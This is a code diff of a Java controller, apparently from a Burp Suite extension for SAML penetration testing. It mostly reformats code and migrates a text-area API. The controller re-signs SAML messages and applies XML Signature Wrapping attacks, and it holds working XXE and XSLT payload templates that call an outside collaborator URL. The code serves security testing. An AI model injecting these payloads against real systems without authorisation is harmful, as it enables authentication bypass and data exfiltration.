+                xmlHelpers.removeEmptyTags(doc);
+                xmlHelpers.signAssertion(doc, signAlgorithm, digestAlgorithm, cert.getCertificate(),
+                        cert.getPrivateKey());
+                SAMLMessage = xmlHelpers.getStringOfDocument(doc, 2, true);
+                textArea.setContents(ByteArray.byteArray(SAMLMessage));
+                isEdited = true;
+                setRawMode(false);
+                setInfoMessageText("Assertions successfully signed");
+            } else {
+                setInfoMessageText("no certificate chosen to sign");
+            }
+        } catch (SAXException e) {
+            setInfoMessageText(XML_NOT_WELL_FORMED);
+        } catch (IOException e) {
+            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
+        } catch (Exception e) {
+            setInfoMessageText(XML_COULD_NOT_SIGN);
+        }
+    }
 
-	public void resignMessage() {
-		try {
-			resetInfoMessageText();
-			if (isWSSMessage) {
-				setInfoMessageText("Message signing is not possible with WS-Security messages");
-			} else {
-				setInfoMessageText("Signing...");
-				BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
-				if (cert != null) {
-					Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
-					NodeList responses = xmlHelpers.getResponse(document);
-					String signAlgorithm = xmlHelpers.getSignatureAlgorithm(responses.item(0));
-					String digestAlgorithm = xmlHelpers.getDigestAlgorithm(responses.item(0));
+    public void resignMessage() {
+        try {
+            resetInfoMessageText();
+            if (isWSSMessage) {
+                setInfoMessageText("Message signing is not possible with WS-Security messages");
+            } else {
+                setInfoMessageText("Signing...");
+                BurpCertificate cert = samlGUI.getActionPanel().getSelectedCertificate();
+                if (cert != null) {
+                    Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getContents().toString());
+                    NodeList responses = xmlHelpers.getResponse(document);
+                    String signAlgorithm = xmlHelpers.getSignatureAlgorithm(responses.item(0));
+                    String digestAlgorithm = xmlHelpers.getDigestAlgorithm(responses.item(0));
 
-					xmlHelpers.removeOnlyMessageSignature(document);
-					xmlHelpers.signMessage(document, signAlgorithm, digestAlgorithm, cert.getCertificate(),
-							cert.getPrivateKey());
-					SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
-					textArea.setText(SAMLMessage.getBytes());
-					isEdited = true;
-					setRawMode(false);
-					setInfoMessageText("Message successfully signed");
-				} else {
-					setInfoMessageText("no certificate chosen to sign");
-				}
-			}
-		} catch (IOException e) {
-			setInfoMessageText(XML_COULD_NOT_SERIALIZE);
-		} catch (SAXException e) {
-			setInfoMessageText(XML_NOT_WELL_FORMED);
-		} catch (CertificateException e) {
-			setInfoMessageText(XML_COULD_NOT_SIGN);
-		} catch (NoSuchAlgorithmException e) {
-			setInfoMessageText(XML_COULD_NOT_SIGN + ", no such algorithm");
-		} catch (InvalidKeySpecException e) {
-			setInfoMessageText(XML_COULD_NOT_SIGN + ", invalid private key");
-		} catch (MarshalException e) {
-			setInfoMessageText(XML_COULD_NOT_SERIALIZE);
-		} catch (XMLSignatureException e) {
-			setInfoMessageText(XML_COULD_NOT_SIGN);
-		}
-	}
+                    xmlHelpers.removeOnlyMessageSignature(document);
+                    xmlHelpers.signMessage(document, signAlgorithm, digestAlgorithm, cert.getCertificate(),
+                            cert.getPrivateKey());
+                    SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
+                    textArea.setContents(ByteArray.byteArray(SAMLMessage));
+                    isEdited = true;
+                    setRawMode(false);
+                    setInfoMessageText("Message successfully signed");
+                } else {
+                    setInfoMessageText("no certificate chosen to sign");
+                }
+            }
+        } catch (IOException e) {
+            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
+        } catch (SAXException e) {
+            setInfoMessageText(XML_NOT_WELL_FORMED);
+        } catch (CertificateException e) {
+            setInfoMessageText(XML_COULD_NOT_SIGN);
+        } catch (NoSuchAlgorithmException e) {
+            setInfoMessageText(XML_COULD_NOT_SIGN + ", no such algorithm");
+        } catch (InvalidKeySpecException e) {
+            setInfoMessageText(XML_COULD_NOT_SIGN + ", invalid private key");
+        } catch (MarshalException e) {
+            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
+        } catch (XMLSignatureException e) {
+            setInfoMessageText(XML_COULD_NOT_SIGN);
+        }
+    }
 
-	private void setInfoMessageText(String infoMessage) {
-		samlGUI.getActionPanel().getInfoMessageLabel().setText(infoMessage);
-	}
+    private void setInfoMessageText(String infoMessage) {
+        samlGUI.getActionPanel().getInfoMessageLabel().setText(infoMessage);
+    }
 
-	private void resetInfoMessageText() {
-		samlGUI.getActionPanel().getInfoMessageLabel().setText("");
-	}
+    private void resetInfoMessageText() {
+        samlGUI.getActionPanel().getInfoMessageLabel().setText("");
+    }
 
-	private void updateCertificateList() {
-		List<BurpCertificate> list = certificateTabController.getCertificatesWithPrivateKey();
-		samlGUI.getActionPanel().setCertificateList(list);
-	}
+    private void updateCertificateList() {
+        List<BurpCertificate> list = certificateTabController.getCertificatesWithPrivateKey();
+        samlGUI.getActionPanel().setCertificateList(list);
+    }
 
-	private void updateXSWList() {
-		samlGUI.getActionPanel().setXSWList(XSWHelpers.xswTypes);
-	}
+    private void updateXSWList() {
+        samlGUI.getActionPanel().setXSWList(XSWHelpers.xswTypes);
+    }
 
-	public void sendToCertificatesTab() {
-		try {
-			Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(new String(textArea.getText()));
-			String cert = xmlHelpers.getCertificate(document.getDocumentElement());
-			if (cert != null) {
-				certificateTabController.importCertificateFromString(cert);
-			} else {
-				setInfoMessageText(XML_CERTIFICATE_NOT_FOUND);
-			}
-		} catch (SAXException e) {
-			setInfoMessageText(XML_NOT_WELL_FORMED);
-		}
-	}
+    public void sendToCertificatesTab() {
+        try {
+            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(textArea.getContents().toString());
+            String cert = xmlHelpers.getCertificate(document.getDocumentElement());
+            if (cert != null) {
+                certificateTabController.importCertificateFromString(cert);
+            } else {
+                setInfoMessageText(XML_CERTIFICATE_NOT_FOUND);
+            }
+        } catch (SAXException e) {
+            setInfoMessageText(XML_NOT_WELL_FORMED);
+        }
+    }
 
-	public void showXSWPreview() {
-		try {
-			Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
-			xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
-			String after = xmlHelpers.getStringOfDocument(document, 2, true);
-			String diff = xswHelpers.diffLineMode(orgSAMLMessage, after);
+    public void showXSWPreview() {
+        try {
+            Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
+            xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
+            String after = xmlHelpers.getStringOfDocument(document, 2, true);
+            String diff = xswHelpers.diffLineMode(orgSAMLMessage, after);
 
-			File file = File.createTempFile("tmp", ".html", null);
-			FileOutputStream fileOutputStream = new FileOutputStream(file);
-			file.deleteOnExit();
-			fileOutputStream.write(diff.getBytes("UTF-8"));
-			fileOutputStream.flush();
-			fileOutputStream.close();
+            File file = File.createTempFile("tmp", ".html", null);
+            FileOutputStream fileOutputStream = new FileOutputStream(file);
+            file.deleteOnExit();
+            fileOutputStream.write(diff.getBytes("UTF-8"));
+            fileOutputStream.flush();
+            fileOutputStream.close();
 
-			URI uri = new URL("file://" + file.getAbsolutePath()).toURI();
+            URI uri = new URL("file://" + file.getAbsolutePath()).toURI();
 
-			Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
-			if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
-				desktop.browse(uri);
-			} else {
-				StringSelection stringSelection = new StringSelection(uri.toString());
-				Clipboard clpbrd = Toolkit.getDefaultToolkit().getSystemClipboard();
-				clpbrd.setContents(stringSelection, null);
-				setInfoMessageText(NO_BROWSER);
-			}
+            Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
+            if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
+                desktop.browse(uri);
+            } else {
+                StringSelection stringSelection = new StringSelection(uri.toString());
+                Clipboard clpbrd = Toolkit.getDefaultToolkit().getSystemClipboard();
+                clpbrd.setContents(stringSelection, null);
+                setInfoMessageText(NO_BROWSER);
+            }
 
-		} catch (SAXException e) {
-			setInfoMessageText(XML_NOT_WELL_FORMED);
-		} catch (DOMException e) {
-			setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
-		} catch (MalformedURLException e) {
-		} catch (URISyntaxException e) {
-		} catch (IOException e) {
-			setInfoMessageText(NO_DIFF_TEMP_FILE);
-		}
-	}
+        } catch (SAXException e) {
+            setInfoMessageText(XML_NOT_WELL_FORMED);
+        } catch (DOMException e) {
+            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
+        } catch (MalformedURLException e) {
+        } catch (URISyntaxException e) {
+        } catch (IOException e) {
+            setInfoMessageText(NO_DIFF_TEMP_FILE);
+        }
+    }
 
-	public void applyXSW() {
-		Document document;
-		try {
-			document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
-			xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
-			SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
-			textArea.setText(SAMLMessage.getBytes());
-			isEdited = true;
-			setRawMode(false);
-			setInfoMessageText(XSW_ATTACK_APPLIED);
-		} catch (SAXException e) {
-			setInfoMessageText(XML_NOT_WELL_FORMED);
-		} catch (IOException e) {
-			setInfoMessageText(XML_COULD_NOT_SERIALIZE);
-		} catch (DOMException | NullPointerException e) {
-			setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
-		}
-	}
-	
-	public void applyXXE(String collabUrl) {
-		String xxePayload = "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe; ]>\n";
-		String[] splitMsg = orgSAMLMessage.split("\\?>");
-		if(splitMsg.length == 2) {
-			SAMLMessage = splitMsg[0] + "?>" + xxePayload + splitMsg[1];
-		}
-		else {
-			String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
-			SAMLMessage = xmlDeclaration + xxePayload + orgSAMLMessage;
-		}
-		textArea.setText(SAMLMessage.getBytes());
-		isEdited = true;
-		setRawMode(true);
-		setInfoMessageText(XXE_CONTENT_APPLIED);
-	}
+    public void applyXSW() {
+        Document document;
+        try {
+            document = xmlHelpers.getXMLDocumentOfSAMLMessage(orgSAMLMessage);
+            xswHelpers.applyXSW(samlGUI.getActionPanel().getSelectedXSW(), document);
+            SAMLMessage = xmlHelpers.getStringOfDocument(document, 2, true);
+            textArea.setContents(ByteArray.byteArray(SAMLMessage));
+            isEdited = true;
+            setRawMode(false);
+            setInfoMessageText(XSW_ATTACK_APPLIED);
+        } catch (SAXException e) {
+            setInfoMessageText(XML_NOT_WELL_FORMED);
+        } catch (IOException e) {
+            setInfoMessageText(XML_COULD_NOT_SERIALIZE);
+        } catch (DOMException | NullPointerException e) {
+            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSW);
+        }
+    }
 
-	public void applyXSLT(String collabUrl) {
-		String xslt = "\n" +
-				"<ds:Transform>\n" +
-				"  <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
-				"    <xsl:template match=\"doc\">\n" +
-				"      <xsl:variable name=\"file\" select=\"'test'\"/>\n" +
-				"      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>\n" +
-				"      <xsl:variable name=\"attackURL\" select=\"'" + collabUrl + "'\"/>\n" +
-				"      <xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" +
-				"      <xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" +
-				"    </xsl:template>\n" +
-				"  </xsl:stylesheet>\n" +
-				"</ds:Transform>";
-		String transformString = "<ds:Transforms>";
-		int index = orgSAMLMessage.indexOf(transformString);
+    public void applyXXE(String collabUrl) {
+        String xxePayload = "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe; ]>\n";
+        String[] splitMsg = orgSAMLMessage.split("\\?>");
+        if (splitMsg.length == 2) {
+            SAMLMessage = splitMsg[0] + "?>" + xxePayload + splitMsg[1];
+        } else {
+            String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
+            SAMLMessage = xmlDeclaration + xxePayload + orgSAMLMessage;
+        }
+        textArea.setContents(ByteArray.byteArray(SAMLMessage));
+        isEdited = true;
+        setRawMode(true);
+        setInfoMessageText(XXE_CONTENT_APPLIED);
+    }
 
-		if(index == -1) {
-			setInfoMessageText(XML_NOT_SUITABLE_FOR_XLST);
-		}
-		else {
-			int substringIndex = index + transformString.length();
-			String firstPart = orgSAMLMessage.substring(0, substringIndex);
-			String secondPart = orgSAMLMessage.substring(substringIndex);
-			SAMLMessage = firstPart + xslt + secondPart;
-			textArea.setText(SAMLMessage.getBytes());
-			isEdited = true;
-			setRawMode(true);
-			setInfoMessageText(XSLT_CONTENT_APPLIED);
-		}		
-	}
-	
-	public synchronized void addMatchAndReplace(String match, String replace) {
-		XSWHelpers.MATCH_AND_REPLACE_MAP.put(match, replace);
-	}
-	
-	public synchronized HashMap<String, String> getMatchAndReplaceMap() {
-		return XSWHelpers.MATCH_AND_REPLACE_MAP;
-	}
+    public void applyXSLT(String collabUrl) {
+        String xslt = "\n" +
+                "<ds:Transform>\n" +
+                "  <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
+                "    <xsl:template match=\"doc\">\n" +
+                "      <xsl:variable name=\"file\" select=\"'test'\"/>\n" +
+                "      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>\n" +
+                "      <xsl:variable name=\"attackURL\" select=\"'" + collabUrl + "'\"/>\n" +
+                "      <xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" +
+                "      <xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" +
+                "    </xsl:template>\n" +
+                "  </xsl:stylesheet>\n" +
+                "</ds:Transform>";
+        String transformString = "<ds:Transforms>";
+        int index = orgSAMLMessage.indexOf(transformString);
 
-	public void setGUIEditable(boolean editable) {
-		if (editable) {
-			samlGUI.getActionPanel().enableControls();
-		} else {
-			samlGUI.getActionPanel().disableControls();
-		}
-	}
+        if (index == -1) {
+            setInfoMessageText(XML_NOT_SUITABLE_FOR_XLST);
+        } else {
+            int substringIndex = index + transformString.length();
+            String firstPart = orgSAMLMessage.substring(0, substringIndex);
+            String secondPart = orgSAMLMessage.substring(substringIndex);
+            SAMLMessage = firstPart + xslt + secondPart;
+            textArea.setContents(ByteArray.byteArray(SAMLMessage));
+            isEdited = true;
+            setRawMode(true);
+            setInfoMessageText(XSLT_CONTENT_APPLIED);
+        }
+    }
 
-	public void showSignatureHelp() {
-		SignatureHelpWindow window = new SignatureHelpWindow();
-		window.setVisible(true);
-	}
+    public synchronized void addMatchAndReplace(String match, String replace) {
+        XSWHelpers.MATCH_AND_REPLACE_MAP.put(match, replace);
+    }
 
-	public void showXSWHelp() {
-		XSWHelpWindow window = new XSWHelpWindow();
-		window.setVisible(true);
-	}
+    public synchronized HashMap<String, String> getMatchAndReplaceMap() {
+        return XSWHelpers.MATCH_AND_REPLACE_MAP;
+    }
 
-	@Override
-	public void update(Observable arg0, Object arg1) {
-		updateCertificateList();
-	}
+    public void setGUIEditable(boolean editable) {
+        if (editable) {
+            samlGUI.getActionPanel().enableControls();
+        } else {
+            samlGUI.getActionPanel().disableControls();
+        }
+    }
 
-	public IBurpExtenderCallbacks getCallbacks() {
-		return callbacks;
-	}
+    public void showSignatureHelp() {
+        SignatureHelpWindow window = new SignatureHelpWindow();
+        window.setVisible(true);
+    }
+
+    public void showXSWHelp() {
+        XSWHelpWindow window = new XSWHelpWindow();
+        window.setVisible(true);
+    }
+
+    @Override
+    public void update(Observable arg0, Object arg1) {
+        updateCertificateList();
+    }
 }
